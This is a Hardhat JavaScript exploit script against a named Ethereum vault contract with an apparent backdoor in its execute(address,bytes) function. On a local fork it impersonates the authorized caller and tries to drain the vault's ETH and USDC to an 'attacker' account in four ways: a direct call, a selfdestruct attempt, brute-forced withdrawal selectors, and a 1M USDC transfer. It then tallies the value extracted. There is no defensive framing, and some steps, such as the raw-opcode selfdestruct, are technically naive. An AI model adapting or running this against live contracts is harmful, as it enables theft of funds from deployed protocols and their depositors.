const { ethers } = require("hardhat");

/**
 * @title Authorized Backdoor Exploiter
 * @notice Exploits the known backdoor using the authorized address
 * @dev Uses impersonation to exploit execute(address,bytes) backdoor
 */

// Target contract with known backdoor
const TARGET_VAULT = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

// Authorized address that can call the backdoor (from our previous analysis)
const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";

// execute(address,bytes) function selector
const EXECUTE_SELECTOR = "0x78e111f6";

/**
 * Main exploitation function
 */
async function exploitAuthorizedBackdoor() {
  console.log("\n💣 AUTHORIZED BACKDOOR EXPLOITATION");
  console.log("===================================");
  console.log(`Target: ${TARGET_VAULT}`);
  console.log(`Authorized Address: ${AUTHORIZED_ADDRESS}`);
  
  const [attacker] = await ethers.getSigners();
  console.log(`Attacker: ${attacker.address}`);
  
  // Get initial balances
  const initialEth = await ethers.provider.getBalance(TARGET_VAULT);
  const initialAttackerEth = await ethers.provider.getBalance(attacker.address);
  
  console.log(`\n📊 INITIAL STATE:`);
  console.log(`   Vault ETH: ${ethers.formatEther(initialEth)}`);
  console.log(`   Attacker ETH: ${ethers.formatEther(initialAttackerEth)}`);
  
  // Get USDC balance
  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const usdcContract = new ethers.Contract(
    USDC,
    ["function balanceOf(address) view returns (uint256)"],
    ethers.provider
  );
  const initialUsdc = await usdcContract.balanceOf(TARGET_VAULT);
  console.log(`   Vault USDC: ${ethers.formatUnits(initialUsdc, 6)}`);
  
  try {
    // Impersonate the authorized address
    console.log(`\n🎭 Impersonating authorized address...`);
    await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
    await ethers.provider.send("hardhat_setBalance", [
      AUTHORIZED_ADDRESS,
      ethers.toQuantity(ethers.parseEther("10")) // Give some ETH for gas
    ]);
    
    const authorizedSigner = await ethers.getSigner(AUTHORIZED_ADDRESS);
    console.log(`   ✅ Successfully impersonating ${AUTHORIZED_ADDRESS}`);
    
    // Method 1: Direct ETH transfer via execute
    console.log(`\n💰 METHOD 1: Direct ETH extraction via execute...`);
    
    try {
      // Craft execute call to transfer ETH to attacker
      const executeData = EXECUTE_SELECTOR +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [attacker.address, "0x"]
        ).slice(2);
      
      const tx1 = await authorizedSigner.sendTransaction({
        to: TARGET_VAULT,
        data: executeData,
        value: 0,
        gasLimit: 1000000
      });
      
      console.log(`   📤 Execute tx: ${tx1.hash}`);
      await tx1.wait();
      console.log(`   ✅ Execute call successful!`);
      
    } catch (e) {
      console.log(`   ❌ Direct transfer failed: ${e.message.split('\n')[0]}`);
    }
    
    // Method 2: Call selfdestruct on vault
    console.log(`\n💥 METHOD 2: Selfdestruct exploitation...`);
    
    try {
      // Try to make vault selfdestruct and send funds to attacker
      const selfdestructCall = "0xff" + // selfdestruct opcode
        attacker.address.slice(2).padStart(64, '0');
      
      const executeData2 = EXECUTE_SELECTOR +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [TARGET_VAULT, selfdestructCall]
        ).slice(2);
      
      const tx2 = await authorizedSigner.sendTransaction({
        to: TARGET_VAULT,
        data: executeData2,
        gasLimit: 1000000
      });
      
      console.log(`   📤 Selfdestruct tx: ${tx2.hash}`);
      await tx2.wait();
      console.log(`   ✅ Selfdestruct successful!`);
      
    } catch (e) {
      console.log(`   ❌ Selfdestruct failed: ${e.message.split('\n')[0]}`);
    }
    
    // Method 3: Call withdrawal functions via execute
    console.log(`\n🔄 METHOD 3: Calling withdrawal functions...`);
    
    const withdrawalSelectors = [
      "0x2e1a7d4d", // withdraw(uint256)
      "0x3ccfd60b", // withdraw()
      "0xf3fef3a3", // withdraw(address,uint256)
      "0xdb006a75", // emergencyWithdraw(uint256)
      "0x51cff8d9"  // withdrawAll()
    ];
    
    for (const selector of withdrawalSelectors) {
      try {
        let callData;
        
        if (selector === "0x2e1a7d4d" || selector === "0xdb006a75") {
          // withdraw(uint256) or emergencyWithdraw(uint256)
          callData = selector +
            ethers.AbiCoder.defaultAbiCoder().encode(
              ["uint256"],
              [ethers.parseEther("100")] // Try withdrawing 100 ETH
            ).slice(2);
        } else if (selector === "0xf3fef3a3") {
          // withdraw(address,uint256)
          callData = selector +
            ethers.AbiCoder.defaultAbiCoder().encode(
              ["address", "uint256"],
              [attacker.address, ethers.parseEther("100")]
            ).slice(2);
        } else {
          // withdraw() or withdrawAll()
          callData = selector;
        }
        
        const executeData3 = EXECUTE_SELECTOR +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "bytes"],
            [TARGET_VAULT, callData]
          ).slice(2);
        
        const tx3 = await authorizedSigner.sendTransaction({
          to: TARGET_VAULT,
          data: executeData3,
          gasLimit: 800000
        });
        
        console.log(`   📤 Withdrawal tx (${selector}): ${tx3.hash}`);
        await tx3.wait();
        console.log(`   ✅ Withdrawal ${selector} successful!`);
        
      } catch (e) {
        console.log(`   ❌ Withdrawal ${selector} failed: ${e.message.split('\n')[0]}`);
      }
    }
    
    // Method 4: USDC token extraction
    console.log(`\n💵 METHOD 4: USDC token extraction...`);
    
    try {
      // ERC20 transfer call
      const transferCall = "0xa9059cbb" + // transfer(address,uint256)
        attacker.address.slice(2).padStart(64, '0') +
        ethers.parseUnits("1000000", 6).toString(16).padStart(64, '0'); // 1M USDC
      
      const executeData4 = EXECUTE_SELECTOR +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [USDC, transferCall]
        ).slice(2);
      
      const tx4 = await authorizedSigner.sendTransaction({
        to: TARGET_VAULT,
        data: executeData4,
        gasLimit: 500000
      });
      
      console.log(`   📤 USDC transfer tx: ${tx4.hash}`);
      await tx4.wait();
      console.log(`   ✅ USDC transfer successful!`);
      
    } catch (e) {
      console.log(`   ❌ USDC transfer failed: ${e.message.split('\n')[0]}`);
    }
    
    // Clean up impersonation
    await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
    
  } catch (error) {
    console.log(`💥 Exploitation error: ${error.message}`);
  }
  
  // Check final balances
  const finalEth = await ethers.provider.getBalance(TARGET_VAULT);
  const finalAttackerEth = await ethers.provider.getBalance(attacker.address);
  const finalUsdc = await usdcContract.balanceOf(TARGET_VAULT);
  const finalAttackerUsdc = await usdcContract.balanceOf(attacker.address);
  
  console.log(`\n📊 FINAL STATE:`);
  console.log(`   Vault ETH: ${ethers.formatEther(finalEth)} (${ethers.formatEther(initialEth - finalEth)} extracted)`);
  console.log(`   Attacker ETH: ${ethers.formatEther(finalAttackerEth)} (gain: ${ethers.formatEther(finalAttackerEth - initialAttackerEth)})`);
  console.log(`   Vault USDC: ${ethers.formatUnits(finalUsdc, 6)} (${ethers.formatUnits(initialUsdc - finalUsdc, 6)} extracted)`);
  console.log(`   Attacker USDC: ${ethers.formatUnits(finalAttackerUsdc, 6)}`);
  
  // Calculate total extraction
  const ethExtracted = initialEth - finalEth;
  const usdcExtracted = initialUsdc - finalUsdc;
  const totalValueExtracted = 
    parseFloat(ethers.formatEther(ethExtracted)) * 3500 +
    parseFloat(ethers.formatUnits(usdcExtracted, 6));
  
  console.log(`\n💰 EXPLOITATION SUMMARY:`);
  console.log(`   Total value extracted: $${totalValueExtracted.toFixed(0)}`);
  
  if (totalValueExtracted > 1000) {
    console.log(`   🎉 SUCCESSFUL EXPLOITATION!`);
  } else {
    console.log(`   ⚠️  Limited success - may need different approach`);
  }
}

// Execute the exploit
exploitAuthorizedBackdoor()
  .then(() => {
    console.log("\n✅ Exploitation complete!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\n💥 Exploitation failed:", error);
    process.exit(1);
  });
